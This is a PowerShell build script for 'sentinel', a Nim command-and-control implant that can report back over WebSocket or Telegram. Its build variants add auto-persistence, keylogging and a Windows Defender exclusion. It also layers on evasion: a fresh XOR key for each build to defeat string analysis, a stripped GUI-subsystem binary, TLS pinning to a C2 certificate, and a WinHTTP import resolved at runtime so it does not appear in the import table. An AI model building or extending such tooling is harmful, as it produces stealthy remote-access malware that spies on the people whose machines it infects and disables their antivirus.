# =============================================================================
# build_sentinel.ps1 - build the sentinel super-agent
#
# sentinel.nim combines agent.nim + agent_hardened.nim + agent_telegram.nim
# into a single file. Transport is selected at compile time:
#   -d:c2_ws    WebSocket only (default, smallest IAT)
#   -d:c2_tg    Telegram only (uses OpenSSL pair, bundled next to exe)
#   -d:c2_both  WebSocket + Telegram out-of-band notifications
#
# Variants (orthogonal to transport):
#   silent       default, smallest surface
#   engagement   auto-persist on first connect
#   aggressive   auto-persist + auto-keylog + Defender exclusion
#
# Examples:
#   .\build_sentinel.ps1                       # ws, silent
#   .\build_sentinel.ps1 -Tg                   # telegram, silent
#   .\build_sentinel.ps1 -Both -Variant engagement
#   .\build_sentinel.ps1 -Tg -BotToken 123:ABC -ChatId -100123
#   .\build_sentinel.ps1 -PinCertPath C:\c2\c2.crt   # enable TLS pinning
#
# All artifacts go to build/. Build/ is wiped on each run.
# =============================================================================

[CmdletBinding()]
param(
    [switch]$Tg          = $false,   # -Tg -> -d:c2_tg
    [switch]$Both        = $false,   # -Both -> -d:c2_both
    [ValidateSet('silent','engagement','aggressive')]
    [string]$Variant     = 'silent',
    [string]$BotToken    = "",      # Telegram bot token (only used with -Tg / -Both)
    [string]$ChatId      = "",      # Telegram chat id
    [string]$PinCertPath = "",      # Path to PEM cert for TLS pinning (ws/both only)
    [string]$Out         = ""       # Override output exe name (default: sentinel_<mode>_<variant>.exe)
)

$ErrorActionPreference = 'Stop'
$env:NIM = "D:\appdata\nim-2.2.10\bin\nim.exe"

# ---- pick transport ----
if ($Both) { $TransportFlag = "c2_both" }
elseif ($Tg) { $TransportFlag = "c2_tg" }
else { $TransportFlag = "c2_ws" }
$TransportName = $TransportFlag.Substring(3)   # ws / tg / both
$OutputName = if ($Out) { $Out } else { "sentinel_${TransportName}_${Variant}.exe" }
$OutputPath = "build\$OutputName"

# ---- build dir + nuke previous ----
New-Item -ItemType Directory -Force -Path build | Out-Null
# Refuse to build over a running agent - a locked exe means the
# compile "succeeds" but the stale binary silently stays in place.
Get-Process -Name 'sentinel_tg_*', 'agent_telegram*' -ErrorAction SilentlyContinue |
    ForEach-Object { Write-Error "Agent process $($_.Id) ($($_.Name)) is still running - stop it before building."; exit 1 }
Get-ChildItem -Path build -Filter 'sentinel_*' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction Stop
if ($Tg -or $Both) {
    # Clean up the old telegram build artifacts
    Get-ChildItem -Path build -Filter 'agent_telegram*' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
}

# ---- write xorkey.nim with a fresh per-build key ----
# 32 bytes (matches the hardened stream cipher). Random per build means
# every binary is uniquely keyed - someone running strings over the .exe
# can't reuse yesterday's key to decode today's constants. Uses the OS
# CSPRNG, not Get-Random (MT19937).
$rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
$keyBytes = New-Object byte[] 32
$rng.GetBytes($keyBytes)
$key = ($keyBytes | ForEach-Object { '{0:x2}' -f $_ }) -join ''
$xorkeyContent = "const XorKey: array[32, byte] = [byte 0x$($key.Substring(0,2)),"
for ($i = 1; $i -lt 32; $i++) {
    $xorkeyContent += " 0x$($key.Substring($i*2, 2)),"
}
$xorkeyContent += "]`n"
Set-Content -Path xorkey.nim -Value $xorkeyContent -Encoding UTF8 -NoNewline

# ---- TLS pin (optional) ----
# When -PinCertPath is provided, generate pin.nim that wraps the cert
# in a const. Nim's `staticRead` reads the file at compile time and
# bakes the bytes into the binary.
if ($PinCertPath -and (Test-Path $PinCertPath)) {
    $escaped = $PinCertPath.Replace('\', '\\')
    Set-Content -Path pin.nim -Value ("const PINNED_CERT_PEM* = staticRead(`"" + $escaped + "`")`n") -Encoding UTF8
} else {
    Set-Content -Path pin.nim -Value "" -Encoding UTF8
}

# ---- build flags ----
$flags = @(
    "-d:release"
    "--opt:size"
    "--app:gui"
    "--path:common"
    "--passL:-s"
    "-d:$TransportFlag"
    "-d:variant_$Variant"
)
if ($PinCertPath -and (Test-Path $PinCertPath)) {
    $flags += "-d:tls_pin"
    $flags += "--include:pin.nim"
}

# Telegram transport uses Windows native WinHTTP (no OpenSSL needed).
# The winhttp.dll is in the system, so no extra DLLs to bundle.
$linkerFlags = ""
if ($Tg -or $Both) {
    # No extra flags - WinHTTP is a Windows system DLL
}

$cmd = "$env:NIM c $flags $linkerFlags --out:$OutputPath sentinel.nim"
$buildStartedAt = Get-Date
Write-Host "[sentinel] building $OutputName ..." -ForegroundColor Cyan
Write-Host "[sentinel] $cmd"
try {
    # Nim writes progress dots/hints to stderr; with redirected stderr
    # and EAP=Stop that surfaces as a terminating NativeCommandError,
    # so relax it around the compiler call (same as build_hardened.ps1).
    $prevEAP = $ErrorActionPreference
    $ErrorActionPreference = "Continue"
    Invoke-Expression $cmd
    $ErrorActionPreference = $prevEAP

    # ---- post-build: copy OpenSSL DLLs for websocket transports ----
    # Only -Both links OpenSSL (via the `ws` package). Pure -Tg reaches
    # api.telegram.org through dynamically-resolved native WinHTTP
    # (winhttp.dll is NOT in the IAT), so no bundled DLLs are needed.
    if ($Both) {
        $opensslDir = "C:\appdata\OpenSSL-Win64\bin"  # adjust if your OpenSSL install differs
        if (-not (Test-Path $opensslDir)) {
            # Try a Nimble-installed location
            $nimbleDir = "$env:USERPROFILE\.nimble\pkgs\openssl-1.2.4\bin"
            if (Test-Path $nimbleDir) { $opensslDir = $nimbleDir }
        }
        $dlls = @("libssl-1_1-x64.dll", "libcrypto-1_1-x64.dll")
        $dllsFound = 0
        foreach ($dll in $dlls) {
            $src = Join-Path $opensslDir $dll
            if (Test-Path $src) {
                Copy-Item -Path $src -Destination "build\" -Force
                Write-Host "[sentinel] bundled $dll" -ForegroundColor Green
                $dllsFound++
            }
        }
        if ($dllsFound -eq 0) {
            Write-Host "[sentinel] WARN: no OpenSSL DLLs found - the telegram variant will fail to start" -ForegroundColor Yellow
            Write-Host "[sentinel]   look in: $opensslDir" -ForegroundColor Yellow
        }
    }
} finally {
    # ---- cleanup transient files (always, even on failed compile) ----
    Remove-Item -Path xorkey.nim -ErrorAction SilentlyContinue
    Remove-Item -Path pin.nim -ErrorAction SilentlyContinue
}

# The exe must be NEWER than the moment the compile started - a stale
# file that survived cleanup would otherwise pass a bare Test-Path.
if ((Test-Path $OutputPath) -and (Get-Item $OutputPath).LastWriteTime -gt $buildStartedAt) {
    $size = (Get-Item $OutputPath).Length
    Write-Host "[sentinel] OK: $OutputPath ($([math]::Round($size/1024)) KB)" -ForegroundColor Green
} else {
    Write-Host "[sentinel] FAIL: $OutputPath not produced (or stale)" -ForegroundColor Red
    exit 1
}
